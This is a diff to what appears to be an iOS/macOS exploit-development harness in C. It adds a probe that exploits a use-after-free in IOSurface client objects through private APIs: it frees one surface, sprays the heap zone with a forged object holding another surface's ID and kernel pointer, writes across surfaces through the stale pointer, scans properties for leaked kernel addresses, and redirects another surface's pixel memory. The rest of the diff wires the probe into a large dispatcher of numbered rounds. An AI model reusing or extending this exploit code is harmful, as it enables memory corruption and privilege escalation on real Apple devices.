@@ -15902,6 +15902,254 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r370: Cross-surface write + deep property dump + backing remap.
+ * 1) SetValue through stale ptr → test cross-surface WRITE
+ * 2) Dump ALL properties including nested dicts for kernel addresses
+ * 3) Test if modifying +112 (base addr) in spray remaps the backing store
+ */
+static void r370_probe(void) {
+    rlog("\n=== r370: Cross-Surface Write + Deep Property Scan ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    typedef CFDictionaryRef (*clientCopyAll_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef void* (*clientGetBaseAddr_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+    clientCopyAll_t clCopyAll = (clientCopyAll_t)dlsym(iosurfH, "IOSurfaceClientCopyAllValues");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientGetBaseAddr_t clGetBase = (clientGetBaseAddr_t)dlsym(iosurfH, "IOSurfaceClientGetBaseAddress");
+
+    if (!clLookup || !clRelease) { rlog("  FATAL: missing APIs\n"); goto r370_done; }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys370[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals370[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys370, (const void**)vals370, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    IOSurfaceRef surf_a = IOSurfaceCreate(crprops);
+    IOSurfaceRef surf_b = IOSurfaceCreate(crprops);
+    if (!surf_a || !surf_b) { rlog("  FATAL\n"); goto r370_free; }
+
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    uint32_t sid_b = IOSurfaceGetID(surf_b);
+    IOSurfaceClientRef cl_a = clLookup(sid_a);
+    IOSurfaceClientRef cl_b = clLookup(sid_b);
+    uint8_t *ba = (uint8_t*)cl_a;
+    uint8_t *bb = (uint8_t*)cl_b;
+    uint64_t kptr_a, kptr_b;
+    memcpy(&kptr_a, ba + 88, 8);
+    memcpy(&kptr_b, bb + 88, 8);
+
+    rlog("  A: ID=%u kptr=0x%llx client=%p\n", sid_a, (unsigned long long)kptr_a, cl_a);
+    rlog("  B: ID=%u kptr=0x%llx\n", sid_b, (unsigned long long)kptr_b);
+
+    /* Set initial properties */
+    CFStringRef mk = CFStringCreateWithCString(NULL, "r370_test", kCFStringEncodingASCII);
+    int bval = 0xBB370; CFNumberRef bnv = CFNumberCreate(NULL, kCFNumberIntType, &bval);
+    clSetValue(cl_b, mk, bnv);
+
+    /* Lock B to initialize its backing store with a pattern */
+    if (clLock) {
+        uint32_t seed = 0;
+        clLock(cl_b, 3, &seed);
+        void *base_b = clGetBase ? clGetBase(cl_b) : NULL;
+        if (base_b) {
+            for (int i = 0; i < 64*64; i++) {
+                ((uint32_t*)base_b)[i] = 0xBEEF0000 | (i & 0xFFFF);
+            }
+        }
+        clUnlock(cl_b, 3, &seed);
+    }
+
+    uint8_t saved[448];
+    memcpy(saved, ba, 448);
+
+    /* Double-free A */
+    rlog("  Freeing A...\n");
+    clRelease(cl_a);
+    CFRelease(surf_a); surf_a = NULL;
+
+    /* Zone-spray with B's SID but A's original base address at +112 */
+    void *slot = malloc_zone_malloc(malloc_zone_from_ptr(cl_b), 448);
+    memcpy(slot, saved, 448);
+    memcpy((uint8_t*)slot + 136, &sid_b, 4);
+    memcpy((uint8_t*)slot + 88, &kptr_b, 8);
+    uint64_t rc = 2; memcpy((uint8_t*)slot + 0, &rc, 8);
+
+    uint32_t check_sid; memcpy(&check_sid, ba + 136, 4);
+    int spray_ok = (check_sid == sid_b);
+    rlog("  Spray %s (stale +136 = %u, want %u)\n",
+        spray_ok ? "HIT" : "MISS", check_sid, sid_b);
+
+    if (!spray_ok) {
+        rlog("  Spray missed. Aborting.\n");
+        malloc_zone_free(malloc_zone_from_ptr(cl_b), slot);
+        goto r370_cleanup;
+    }
+
+    /* ---- Test 1: Cross-surface WRITE ---- */
+    rlog("\n--- Test 1: SetValue through stale pointer (cross-write) ---\n");
+    fflush(stdout);
+
+    CFStringRef wk = CFStringCreateWithCString(NULL, "r370_written", kCFStringEncodingASCII);
+    int wval = 0xDEAD0370;
+    CFNumberRef wnv = CFNumberCreate(NULL, kCFNumberIntType, &wval);
+    clSetValue(cl_a, wk, wnv);
+    rlog("  SetValue through stale ptr: set r370_written=0x%x\n", wval);
+
+    /* Read from B's normal client */
+    CFTypeRef rv = clCopyValue(cl_b, wk);
+    if (rv) {
+        int rval = 0; CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &rval);
+        rlog("  Read from B: r370_written=0x%x\n", rval);
+        if (rval == wval) {
+            rlog("  *** CROSS-SURFACE WRITE CONFIRMED! ***\n");
+        }
+        CFRelease(rv);
+    } else {
+        rlog("  B's CopyValue returned NULL\n");
+    }
+
+    /* ---- Test 2: Deep property dump ---- */
+    rlog("\n--- Test 2: Deep property dump (looking for kptrs) ---\n");
+    fflush(stdout);
+
+    if (clCopyAll) {
+        CFDictionaryRef all = clCopyAll(cl_a);
+        if (all) {
+            CFIndex cnt = CFDictionaryGetCount(all);
+            rlog("  Total properties: %ld\n", (long)cnt);
+            CFStringRef allkeys[64];
+            CFTypeRef allvals[64];
+            int n = cnt > 64 ? 64 : (int)cnt;
+            CFDictionaryGetKeysAndValues(all, (const void**)allkeys, (const void**)allvals);
+            for (int i = 0; i < n; i++) {
+                char kbuf[128] = {0};
+                CFStringGetCString(allkeys[i], kbuf, sizeof(kbuf), kCFStringEncodingASCII);
+                CFTypeID tid = CFGetTypeID(allvals[i]);
+                if (tid == CFNumberGetTypeID()) {
+                    long long v = 0;
+                    CFNumberGetValue((CFNumberRef)allvals[i], kCFNumberLongLongType, &v);
+                    int is_kptr = ((v >> 40) == 0xFFFFFF || (v >> 40) == -1);
+                    rlog("    %s = 0x%llx%s\n", kbuf, v, is_kptr ? " [KPTR!]" : "");
+                } else if (tid == CFDataGetTypeID()) {
+                    CFDataRef d = (CFDataRef)allvals[i];
+                    CFIndex len = CFDataGetLength(d);
+                    const uint8_t *bytes = CFDataGetBytePtr(d);
+                    rlog("    %s = CFData(%ld bytes)", kbuf, (long)len);
+                    /* Scan for kernel pointers */
+                    int found_kptr = 0;
+                    for (CFIndex j = 0; j + 8 <= len; j += 8) {
+                        uint64_t v; memcpy(&v, bytes + j, 8);
+                        if ((v >> 40) == 0xFFFFFF) {
+                            rlog("\n      +%ld: 0x%llx [KPTR!]", (long)j, (unsigned long long)v);
+                            found_kptr++;
+                        }
+                    }
+                    rlog("%s\n", found_kptr ? "" : " (no kptrs)");
+                } else if (tid == CFDictionaryGetTypeID()) {
+                    CFDictionaryRef sub = (CFDictionaryRef)allvals[i];
+                    CFIndex scnt = CFDictionaryGetCount(sub);
+                    rlog("    %s = CFDictionary(%ld entries):\n", kbuf, (long)scnt);
+                    CFStringRef skeys[32]; CFTypeRef svals[32];
+                    int sn = scnt > 32 ? 32 : (int)scnt;
+                    CFDictionaryGetKeysAndValues(sub, (const void**)skeys, (const void**)svals);
+                    for (int j = 0; j < sn; j++) {
+                        char skbuf[128] = {0};
+                        CFStringGetCString(skeys[j], skbuf, sizeof(skbuf), kCFStringEncodingASCII);
+                        CFTypeID stid = CFGetTypeID(svals[j]);
+                        if (stid == CFNumberGetTypeID()) {
+                            long long sv = 0;
+                            CFNumberGetValue((CFNumberRef)svals[j], kCFNumberLongLongType, &sv);
+                            int is_kptr = ((sv >> 40) == 0xFFFFFF || (sv >> 40) == -1);
+                            rlog("      %s = 0x%llx%s\n", skbuf, sv, is_kptr ? " [KPTR!]" : "");
+                        } else {
+                            rlog("      %s = (%s)\n", skbuf, stid == CFStringGetTypeID() ? "string" : "other");
+                        }
+                    }
+                } else if (tid == CFStringGetTypeID()) {
+                    char sbuf[256] = {0};
+                    CFStringGetCString((CFStringRef)allvals[i], sbuf, sizeof(sbuf), kCFStringEncodingASCII);
+                    rlog("    %s = \"%s\"\n", kbuf, sbuf);
+                } else {
+                    rlog("    %s = (typeID=%lu)\n", kbuf, (unsigned long)tid);
+                }
+            }
+            CFRelease(all);
+        }
+    }
+
+    /* ---- Test 3: Lock with B's base address at +112 ---- */
+    rlog("\n--- Test 3: Lock with B's base at +112 ---\n");
+    fflush(stdout);
+
+    /* Rewrite the spray slot with B's base address at +112 */
+    uint64_t b_base; memcpy(&b_base, bb + 112, 8);
+    memcpy((uint8_t*)slot + 112, &b_base, 8);
+    rlog("  Set stale +112 = B's base 0x%llx\n", (unsigned long long)b_base);
+
+    if (clLock && clGetBase) {
+        uint32_t seed = 0;
+        kern_return_t lk = clLock(cl_a, 1, &seed);
+        rlog("  Lock result: 0x%x\n", lk);
+        if (lk == KERN_SUCCESS) {
+            void *base = clGetBase(cl_a);
+            rlog("  GetBase: %p\n", base);
+            if (base == (void*)b_base) {
+                rlog("  *** BACKING STORE REDIRECT: Reading B's pixel data! ***\n");
+                /* Verify by checking for BEEF pattern */
+                uint32_t first; memcpy(&first, base, 4);
+                rlog("  First pixel: 0x%08x (expect 0xBEEF0000)\n", first);
+                if ((first & 0xFFFF0000) == 0xBEEF0000) {
+                    rlog("  *** CONFIRMED: Pixel data is B's BEEF pattern! ***\n");
+                }
+            }
+            clUnlock(cl_a, 1, &seed);
+        }
+    }
+
+r370_cleanup:
+    clRelease(cl_b);
+    if (slot) malloc_zone_free(malloc_zone_from_ptr(cl_b), slot);
+
+r370_free:
+    if (surf_b) CFRelease(surf_b);
+    if (surf_a) CFRelease(surf_a);
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    CFRelease(mk); CFRelease(bnv);
+r370_done:
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r370 complete ===\n");
+    fflush(stdout);
+}
+
 /* r369: Cross-surface property read via zone-spray UAF.
  * Zone spray the freed slot with original data but swap +136 to B's SID.
  * CopyValue through stale pointer should read B's properties.
@@ -55987,6 +56235,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 373) {
+            rlog("*** rounds=373: Cross-Surface Write + Deep Property Scan ***\n");
+            rlog("  Test SetValue write, dump all properties for kptrs,\n");
+            rlog("  and test backing store redirect via +112.\n\n");
+            fflush(stdout);
+            r370_probe();
+            goto done;
+        }
         if (rounds == 372) {
             rlog("*** rounds=372: Cross-Surface Read via Zone-Spray UAF ***\n");
             rlog("  Spray freed slot with saved data + B's SID at +136,\n");
@@ -58174,7 +58430,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -68016,7 +68272,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
